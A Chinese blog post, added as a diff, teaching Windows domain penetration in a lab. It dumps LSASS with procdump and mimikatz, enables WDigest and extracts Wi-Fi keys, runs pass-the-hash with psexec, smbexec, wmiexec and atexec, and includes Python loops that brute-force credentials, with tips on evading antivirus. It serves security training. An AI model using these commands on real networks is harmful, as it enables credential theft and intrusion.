@@ -1,6 +1,453 @@
 <!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>内网渗透篇 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
 </head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
 </script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">内网渗透篇</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/">2022-03-18</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>&nbsp;&bull;&nbsp;<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/">内网</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="域的搭建"><a href="#域的搭建" class="headerlink" title="域的搭建"></a>域的搭建</h1><p>实验环境:</p>
+<p>win2008 域控       本地管理员密码:0801.com  域密码:yk2008.com    ip:192.168.137.2     </p>
+<p>win 2008 域成员  本地管理员密码:0802.com  域密码:yc2008.com    ip:192.168.137.66</p>
+<p>win 2003 域成员  本地管理员密码:0301.com  域密码: yc2003.com    ip:192.168.137.99</p>
+<p><strong>配置域控2008</strong></p>
+<p>使用vm1网卡</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141739390.png" alt="image-20220322141739390"></p>
+<p>配置ip</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141649714.png" alt="image-20220322141649714"></p>
+<p>找到服务器管理器</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135655066.png" alt="image-20220322135655066"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135624657.png" alt="image-20220322135624657"></p>
+<p>一直下一步，然后安装</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140010325.png" alt="image-20220322140010325"></p>
+<p>安装成功</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140057795.png" alt="image-20220322140057795"></p>
+<p>运行dcpromo程序:</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141947512.png" alt="image-20220322141947512"></p>
+<p>一直下一步，到这里新建域</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142110877.png" alt="image-20220322142110877"></p>
+<p>命名林根域</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142158498.png" alt="image-20220322142158498"></p>
+<p>选择2008 R2</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142302851.png" alt="image-20220322142302851"></p>
+<p>一直下一步/默认是，到这一步设置密码为:yk2008.com</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142632261.png" alt="image-20220322142632261"></p>
+<p>一直下一步</p>
+<p>完成了域控的配置，并重启</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142812609.png" alt="image-20220322142812609"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142833978.png" alt="image-20220322142833978"></p>
+<p>重启后，有域的标识出现，我们使用前文设置的域控密码登录</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322143248873.png" alt="image-20220322143248873"></p>
+<p>进入后</p>
+<p>打开域管理中心</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322150310596.png" alt="image-20220322150310596"></p>
+<p>打开用户和计算机，新建组织hack</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151545759.png" alt="image-20220322151545759"></p>
+<p>在这个组分别建立server2003用户和server2008用户，设置域密码分别为 yc2003.com和yc2008.com</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151809690.png" alt="image-20220322151809690"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151918916.png" alt="image-20220322151918916"></p>
+<p>到这里域控的配置就完成了，接下来就让域成员加入域</p>
+<p>进入windows2003</p>
+<p>更改计算机名加入域</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322153432998.png" alt="image-20220322153432998"></p>
+<p>windows2008同理</p>
+<p>然后重启</p>
+<p>输入加入域的计算机名</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154303764.png" alt="image-20220322154303764"></p>
+<p>成功登入</p>
+<img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154329618.png" alt="image-20220322154329618" style="zoom:50%;">
+
+<p>我们在域控中就能看到两台计算机上线</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154709810.png" alt="image-20220322154709810"></p>
+<p>域环境就搭建好了</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><strong>基本信息收集：</strong></p>
+<p>了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p>
+<pre><code>systeminfo 详细信息
+net start 启动服务
+tasklist 进程列表
+schtasks 计划任务
+</code></pre>
+<p><strong>网络信息收集:</strong></p>
+<p>了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p>
+<pre><code>ipconfig /all 判断存在域-dns
+net view /domain 判断存在域
+net time /domain 判断主域
+netstat -ano 当前网络端口开放
+nslookup 域名 追踪来源地址
+</code></pre>
+<p><strong>用户信息收集:</strong></p>
+<p>了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p>
+<pre><code>Domain Admins：域管理员（默认对域控制器有完全控制权）
+Domain Computers：域内机器
+Domain Controllers：域控制器
+Domain Guest：域访客，权限低
+Domain Users：域用户
+Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）
+相关用户收集操作命令：
+whoami /all 用户权限
+net config workstation 登录信息
+net user 本地用户
+net localgroup 本地用户组
+net user /domain 获取域用户信息
+net group /domain 获取域用户组信息
+wmic useraccount get /all 涉及域用户详细信息
+net group &quot;Domain Admins&quot; /domain 查询域管理员账户
+net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组
+net group &quot;Domain Controllers&quot; /domain 查询域控制器
+</code></pre>
+<p><strong>凭据信息收集操作:</strong></p>
+<p>收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p>
+<pre><code>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)
+计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)
+Netsh WLAN show profiles
+Netsh WLAN show profile name=&quot;无线名称&quot; key=clear
+1.站点源码备份文件、数据库备份文件等
+2.各类数据库 Web 管理入口，如 PHPMyAdmin
+3.浏览器保存密码、浏览器 Cookies
+4.其他用户会话、3389 和 ipc$连接记录、回收站内容
+5.Windows 保存的 WIFI 密码
+6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等
+</code></pre>
+<p><strong>探针主机域控架构服务:</strong></p>
+<p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p>
+<pre><code>探针域控制器名及地址信息
+net time /domain nslookup ping
+探针域内存活主机及地址信息
+nbtscan 192.168.3.0/24 第三方工具
+for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 自带内部命令
+nmap masscan 第三方 PowerShell 脚本 nishang empire 等
+#导入模块 nishang
+Import-Module .\nishang.psm1
+#设置执行策略
+Set-ExecutionPolicy RemoteSigned
+#获取模块 nishang 的命令函数
+Get-Command -Module nishang
+#获取常规计算机信息
+Get-Information
+#端口扫描（查看目录对应文件有演示语法，其他同理）
+Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort
+#其他功能：删除补丁，反弹 Shell，凭据获取等
+探针域内主机角色及服务信息
+利用开放端口服务及计算机名判断
+核心业务机器:
+1.高级管理人员、系统管理员、财务/人事/业务人员的个人计算机
+2.产品管理系统服务器
+3.办公系统服务器
+4.财务应用系统服务器
+5.核心产品源码服务器（自建 SVN、GIT）
+6.数据库服务器
+7.文件或网盘服务器、共享服务器
+8.电子邮件服务器
+9.网络监控系统服务器
+10.其他服务器（内部技术文档服务器、其他监控服务器等）
+</code></pre>
+<h1 id="域横向"><a href="#域横向" class="headerlink" title="域横向"></a>域横向</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/1b22fbb60e7aa3f167c08e67c61e025e73769fd3.png@942w_611h_progressive.webp" alt="img"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320150741924.png" alt="image-20220320150741924"></p>
+<h2 id="域横向必备知识点"><a href="#域横向必备知识点" class="headerlink" title="域横向必备知识点"></a><strong>域横向必备知识点</strong></h2><p><strong>知识点1：</strong><br>Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码<br>Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p>
+<pre><code>针对以上情况，我们提供了4种方式解决此类问题
+1.利用哈希 hash 传递(pth，ptk等)进行移动
+2.利用其它服务协议(SMB,WMI等)进行哈希移动
+3.利用注册表操作开启Wdigest Auth值进行获取
+4.利用工具或第三方平台(Hachcat)进行破解获取
+</code></pre>
+<pre><code>#注册表操作开启Wdigest Auth值
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre>
+<p><strong>知识点2：</strong><br>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
+<pre><code>#获取win密码hash的两个工具
+Pwdump7
+QuarksPwdump
+</code></pre>
+<p><strong>知识点3：</strong><br>域用户与本地用户的区别<br>比如，<code>god/administrator</code>是域用户，<code>./administrator</code>是本地用户</p>
+<h2 id="at-amp-amp-schtasks-密码是明文"><a href="#at-amp-amp-schtasks-密码是明文" class="headerlink" title="at&amp;&amp;schtasks(密码是明文)"></a><strong>at&amp;&amp;schtasks(密码是明文)</strong></h2><p><strong>优点:官方自带命令，不会被杀</strong></p>
+<p><strong>缺点:命令比较繁琐，且只支持明文密码</strong></p>
+<p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 这里介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主 机上执行命令</p>
+<p>获取到某域主机权限–&gt;minikatz 得到密码（明文，hash）–&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典–&gt;尝试连接–&gt;创建计划任务(at|schtasks)–&gt;执行文件可为后门或者相关命令</p>
+<p>利用流程:</p>
+<ol>
+<li>建立 IPC 链接到目标主机 (目标主机要开启135，445)</li>
+<li> 拷贝要执行的命令脚本到目标主机 </li>
+<li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本 </li>
+<li> 删除 IPC 链接 </li>
+</ol>
+<pre><code>net use \\server\ipc$&quot;password&quot; /user:username # 工作组 
+net use \\server\ipc$&quot;password&quot; /user:domain\username #域内 
+dir \\xx.xx.xx.xx\C$\ # 查看文件列表 
+copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件 
+copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件 
+net use \\xx.xx.xx.xx\C$\1.bat /del # 删除 
+IPC net view xx.xx.xx.xx # 查看对方共享 
+#建立 IPC 常见的错误代码 
+（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 
+（2）51：网络问题，Windows 无法找到网络路径 
+（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题 
+（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$ 
+（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除 
+（6）1326：账号密码错误 
+（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况 
+（8）2242：用户密码过期，目标有账号策略，强制定期更改密码 
+#建立 IPC 失败的原因 
+（1）目标系统不是 NT 或以上的操作系统 
+（2）对方没有打开 IPC$共享 
+（3）对方未开启 139、445 端口，或者被防火墙屏蔽 
+（4）输出命令、账号密码有错误
+</code></pre>
+<pre><code>[at] &amp; [schtasks]
+#at &lt; Windows2012
+net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立 ipc 连接：
+copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器
+at \\192.168.3.21 15:47 c:\add.bat #添加计划任务
+#schtasks &gt;=Windows2012
+net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立 ipc 连接：
+copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘
+schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务
+对应执行文件
+schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务
+schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务
+</code></pre>
+<h2 id="atexec-impacket-明文和HASH-传递攻击"><a href="#atexec-impacket-明文和HASH-传递攻击" class="headerlink" title="atexec-impacket 明文和HASH 传递攻击"></a><strong>atexec-impacket 明文和HASH 传递攻击</strong></h2><p><strong>impacket的exe版本:<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></strong></p>
+<p><strong>优点:命令简单，易上手</strong></p>
+<p><strong>缺点:非官方自带，可能被杀</strong></p>
+<pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
+atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
+atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320153845240.png" alt="image-20220320153845240"></p>
+<p><strong>明文 HASH 传递批量利用</strong></p>
+<p>收集活跃ip，放在ip.txt中</p>
+<pre><code>FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测 IP 对应明文连接
+FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文回显版
+</code></pre>
+<p>收集可能的密码和hash放在文件中</p>
+<pre><code>FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP回显版
+FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测 HASH 对应 IP 回显版
+</code></pre>
+<p><strong>明文HASH传递批量利用-升级版</strong></p>
+<p>利用py脚本制作的exe文件批量尝试横向渗透</p>
+<p>Fuck.py</p>
+<pre><code class="python">import os
+import time
+
+ips=&#123;
+    &#39;192.168.3.30&#39;,
+    &#39;192.168.3.25&#39;,
+    &#39;192.168.3.32&#39;,
+    &#39;192.168.3.29&#39;
+&#125;
+
+users=&#123;
+    &#39;admin&#39;,
+    &#39;user&#39;,
+    &#39;Administrator&#39;,
+    &#39;webadmin&#39;,
+    &#39;boss&#39;
+
+&#125;
+
+passwds=&#123;
+    &#39;123456&#39;,
+    &#39;passwd&#39;,
+    &#39;admin123&#39;
+    &#39;admin666&#39;
+
+&#125;
+
+for ip in ips:
+    for user in users:
+        for passwd in passwds:
+            exec = &quot;net use \\&quot;+ &quot;\\&quot; + ip +&#39;ipc$ &#39;+passwd+&#39; /user:god\\&#39; + user
+            print(&#39;----&gt;&#39;+exec+&#39;&lt;----&#39;)
+            os.system(exec)
+            time.sleep(1)
+</code></pre>
+<p>执行效果</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320161721565.png" alt="image-20220320161721565"></p>
+<p>将python脚本编译成exe文件</p>
+<p>安装pyinstaller</p>
+<pre><code>pip install pyinstaller
+</code></pre>
+<p>生成可执行EXE</p>
+<pre><code>Pyinstaller -F [.py文件]
+</code></pre>
+<p>会生成一个同名的exe文件 </p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162043000.png" alt="image-20220320162043000"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162242560.png" alt="image-20220320162242560"></p>
+<h2 id="Procdump-Mimikatz-配合获取hash密码"><a href="#Procdump-Mimikatz-配合获取hash密码" class="headerlink" title="Procdump+Mimikatz 配合获取hash密码"></a><strong>Procdump+Mimikatz 配合获取hash密码</strong></h2><p>这种情况适用于mimikatz被杀，但是自己做免杀失败/或不想做免杀可以来与Procdump配合使用，因为Procdump是官方自带的，所以不会被杀</p>
+<ul>
+<li>Procdump下载：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></li>
+<li>mimikatz下载：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li>
+</ul>
+<pre><code># procdump 在目标机上执行
+procdump -accepteula -ma lsass.exe lsass.dmp
+# mimikatz 在本地执行：
+privilege::debuge
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320165205243.png" alt="image-20220320165205243"></p>
+<p>然后可以利用 Hashcat 破解获取 Windows NTML Hash</p>
+<h2 id="SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方"><a href="#SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方" class="headerlink" title="SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)"></a><strong>SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)</strong></h2><p><strong>psexec</strong></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p>
+<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。</p>
+<pre><code>#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递
+net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator
+psexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行
+exit #退出
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320171306833.png" alt="image-20220320171306833"></p>
+<pre><code>#psexec 第二种：不用建立 IPC 直接提供明文账户密码
+psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172223595.png" alt="image-20220320172223595"></p>
+<p>但是当我们使用hash传递时</p>
+<pre><code>psexec -hashes :$HASH$ ./administrator@10.1.2.3
+psexec -hashes :$HASH$ domain/administrator@10.1.2.3
+psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法采用 hash 连接
+#非官方自带-参考 impacket 工具包使用，操作简单，容易被杀
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172705914.png" alt="image-20220320172705914"></p>
+<p>就会出现问题，这是因为官方 Pstools 无法采用 hash 连接，所以我们可以使用 impacket 工具包</p>
+<p>缺点:非官方，会被杀毒软件杀掉，所以要做免杀</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173053675.png" alt="image-20220320173053675"></p>
+<p><strong>smbexec</strong></p>
+<p>无需先 ipc 链接 明文或 hash 传递</p>
+<pre><code>smbexec god/administrator:Admin12345@192.168.3.21
+smbexec ./administrator:admin!@#45@192.168.3.32
+smbexec -hashes :$HASH$ ./admin@192.168.3.21
+smbbexec -hashes :$HASH$ domain/admin@192.168.3.21
+smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
+smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173615976.png" alt="image-20220320173615976"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173738115.png" alt="image-20220320173738115"></p>
+<h2 id="WMI-服务利用-wmic-cscript-wmiexec"><a href="#WMI-服务利用-wmic-cscript-wmiexec" class="headerlink" title="WMI 服务利用-wmic,cscript,wmiexec"></a><strong>WMI 服务利用-wmic,cscript,wmiexec</strong></h2><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
+<p><strong>自带 WMIC 明文传递 无回显 所以写入文件夹后还要自己想办法读取</strong></p>
+<pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;    
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180441580.png" alt="image-20220320180441580"></p>
+<p><strong>自带 cscript 明文传递 有回显</strong></p>
+<pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
+#escript不需要下载，自带。但是需要用到第三方 wmiexec.vbs，但是wmiexec.vbs免杀非常简单
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180646769.png" alt="image-20220320180646769"></p>
+<p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p>
+<pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;
+wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
+wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;
+wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;
+</code></pre>
+<p>缺点：容易被杀</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181811547.png" alt="image-20220320181811547"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181844775.png" alt="image-20220320181844775"></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320182207418.png" alt="image-20220320182207418"></p>
+<p>同理可以借用编程解放双手</p>
+<p><strong>hash 批量利用-python 编译 exe</strong></p>
+<pre><code class="python">#pyinstaller.exe -F fuck_neiwang_002.py
+import os,time
+ips=&#123;
+&#39;192.168.3.21&#39;,
+&#39;192.168.3.25&#39;,
+&#39;192.168.3.29&#39;,
+&#39;192.168.3.30&#39;,
+&#39;192.168.3.32&#39;
+&#125;
+users=&#123;
+&#39;Administrator&#39;,
+&#39;boss&#39;,
+&#39;dbadmin&#39;,
+&#39;fileadmin&#39;,
+&#39;mack&#39;,
+&#39;mary&#39;,
+&#39;webadmin&#39;
+&#125;
+hashs=&#123;
+&#39;ccef208c6485269c20db2cad21734fe7&#39;,
+&#39;518b98ad4178a53695dc997aa02d455c&#39;
+&#125;
+for ip in ips:
+for user in users:
+for mimahash in hashs:
+#wmiexec -hashes :hashgod/user@ipwhoami
+exec = &quot;wmiexec -hashes :&quot;+mimahash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;
+print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)
+os.system(exec)
+time.sleep(0.5)
+</code></pre>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320183203790.png" alt="image-20220320183203790"></p>
+<h2 id="PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="PTH&amp;PTK&amp;PTT哈希票据传递"></a><strong>PTH&amp;PTK&amp;PTT哈希票据传递</strong></h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322132427400.png" alt="image-20220322132427400"></p>
+<p>Kerberos 协议在域中具体工作方法： </p>
+<p>**1、客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用 krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检 测，成功之后创建 TGT(Ticket-Granting Ticket) **</p>
+<p>**2、将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据 **</p>
+<p>**3、 然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服 务）票证，并且对 TGT 进行检测 **</p>
+<p><strong>4、 检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。</strong></p>
+<pre><code>PTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试 
+PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试 
+PTK(pass the key) #利用的 ekeys aes256 进行的渗透测试
+</code></pre>
+<p><strong>PTH</strong></p>
+<p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p>
